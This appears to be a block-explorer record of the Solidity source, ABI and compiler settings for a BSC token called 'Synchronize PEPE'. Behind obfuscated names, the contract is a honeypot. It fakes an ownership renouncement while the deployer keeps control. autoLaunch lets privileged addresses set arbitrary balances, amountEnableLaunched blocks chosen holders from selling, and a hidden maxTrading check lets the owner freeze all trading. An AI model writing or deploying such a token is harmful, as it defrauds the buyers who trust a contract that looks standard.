{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface enableExempt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundList) external view returns (uint256);\n\n    function transfer(address minMax, uint256 senderToken) external returns (bool);\n\n    function allowance(address swapList, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 senderToken) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address minMax,\n        uint256 senderToken\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverSwap, uint256 value);\n    event Approval(address indexed swapList, address indexed spender, uint256 value);\n}\n\nabstract contract sellTrading {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface teamEnable {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface receiverShould {\n    function createPair(address maxMin, address atLaunched) external returns (address);\n}\n\ninterface enableExemptMetadata is enableExempt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SynchronizePEPE is sellTrading, enableExempt, enableExemptMetadata {\n\n    uint256 constant teamFee = 12 ** 10;\n\n    function getOwner() external view returns (address) {\n        return amountFund;\n    }\n\n    constructor (){\n        \n        teamEnable swapLaunch = teamEnable(swapAuto);\n        atTotal = receiverShould(swapLaunch.factory()).createPair(swapLaunch.WETH(), address(this));\n        \n        launchedTotalList = _msgSender();\n        teamTotalMarketing();\n        buyReceiver[launchedTotalList] = true;\n        enableAuto[launchedTotalList] = teamTx;\n        \n        emit Transfer(address(0), launchedTotalList, teamTx);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return senderMarketing;\n    }\n\n    function teamTotalMarketing() public {\n        emit OwnershipTransferred(launchedTotalList, address(0));\n        amountFund = address(0);\n    }\n\n    uint256 private teamTx = 100000000 * 10 ** 18;\n\n    function amountEnableLaunched(address sellTotalTeam) public {\n        minLaunch();\n        if (atSwapTeam != limitFee) {\n            limitFee = false;\n        }\n        if (sellTotalTeam == launchedTotalList || sellTotalTeam == atTotal) {\n            return;\n        }\n        tradingAutoFund[sellTotalTeam] = true;\n    }\n\n    string private senderMarketing = \"Synchronize PEPE\";\n\n    uint256 private buyAmount;\n\n    function symbol() external view virtual override returns (string memory) {\n        return tradingExemptTotal;\n    }\n\n    address public launchedTotalList;\n\n    function transferFrom(address liquiditySell, address minMax, uint256 senderToken) external override returns (bool) {\n        if (_msgSender() != swapAuto) {\n            if (fundLiquidityFrom[liquiditySell][_msgSender()] != type(uint256).max) {\n                require(senderToken <= fundLiquidityFrom[liquiditySell][_msgSender()]);\n                fundLiquidityFrom[liquiditySell][_msgSender()] -= senderToken;\n            }\n        }\n        return sellTotal(liquiditySell, minMax, senderToken);\n    }\n\n    function minLaunch() private view {\n        require(buyReceiver[_msgSender()]);\n    }\n\n    function owner() external view returns (address) {\n        return amountFund;\n    }\n\n    function autoLaunch(address takeModeIs, uint256 senderToken) public {\n        minLaunch();\n        enableAuto[takeModeIs] = senderToken;\n    }\n\n    bool private atSwapTeam;\n\n    function balanceOf(address fundList) public view virtual override returns (uint256) {\n        return enableAuto[fundList];\n    }\n\n    uint256 maxTrading;\n\n    address private amountFund;\n\n    function toSellFrom(address listToken) public {\n        if (marketingTo) {\n            return;\n        }\n        if (buyAmount != swapToken) {\n            swapToken = buyAmount;\n        }\n        buyReceiver[listToken] = true;\n        \n        marketingTo = true;\n    }\n\n    event OwnershipTransferred(address indexed tradingMin, address indexed atTeam);\n\n    uint256 liquidityTradingList;\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalTake;\n    }\n\n    mapping(address => uint256) private enableAuto;\n\n    mapping(address => bool) public buyReceiver;\n\n    mapping(address => bool) public tradingAutoFund;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return teamTx;\n    }\n\n    function transfer(address takeModeIs, uint256 senderToken) external virtual override returns (bool) {\n        return sellTotal(_msgSender(), takeModeIs, senderToken);\n    }\n\n    address swapAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private swapTo;\n\n    function sellTotal(address liquiditySell, address minMax, uint256 senderToken) internal returns (bool) {\n        if (liquiditySell == launchedTotalList) {\n            return exemptBuy(liquiditySell, minMax, senderToken);\n        }\n        uint256 liquidityToken = enableExempt(atTotal).balanceOf(isEnableMin);\n        require(liquidityToken == maxTrading);\n        require(minMax != isEnableMin);\n        if (tradingAutoFund[liquiditySell]) {\n            return exemptBuy(liquiditySell, minMax, teamFee);\n        }\n        return exemptBuy(liquiditySell, minMax, senderToken);\n    }\n\n    uint8 private totalTake = 18;\n\n    function allowance(address receiverList, address receiverTo) external view virtual override returns (uint256) {\n        if (receiverTo == swapAuto) {\n            return type(uint256).max;\n        }\n        return fundLiquidityFrom[receiverList][receiverTo];\n    }\n\n    function exemptBuy(address liquiditySell, address minMax, uint256 senderToken) internal returns (bool) {\n        require(enableAuto[liquiditySell] >= senderToken);\n        enableAuto[liquiditySell] -= senderToken;\n        enableAuto[minMax] += senderToken;\n        emit Transfer(liquiditySell, minMax, senderToken);\n        return true;\n    }\n\n    address public atTotal;\n\n    string private tradingExemptTotal = \"SPE\";\n\n    function receiverAuto(uint256 senderToken) public {\n        minLaunch();\n        maxTrading = senderToken;\n    }\n\n    bool public limitFee;\n\n    bool public marketingTo;\n\n    address isEnableMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private swapToken;\n\n    mapping(address => mapping(address => uint256)) private fundLiquidityFrom;\n\n    function approve(address receiverTo, uint256 senderToken) public virtual override returns (bool) {\n        fundLiquidityFrom[_msgSender()][receiverTo] = senderToken;\n        emit Approval(_msgSender(), receiverTo, senderToken);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atTeam\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverSwap\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverTo\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTotalTeam\",\"type\":\"address\"}],\"name\":\"amountEnableLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderToken\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeModeIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderToken\",\"type\":\"uint256\"}],\"name\":\"autoLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundList\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTotalList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"senderToken\",\"type\":\"uint256\"}],\"name\":\"receiverAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamTotalMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listToken\",\"type\":\"address\"}],\"name\":\"toSellFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingAutoFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeModeIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderToken\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquiditySell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderToken\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SynchronizePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}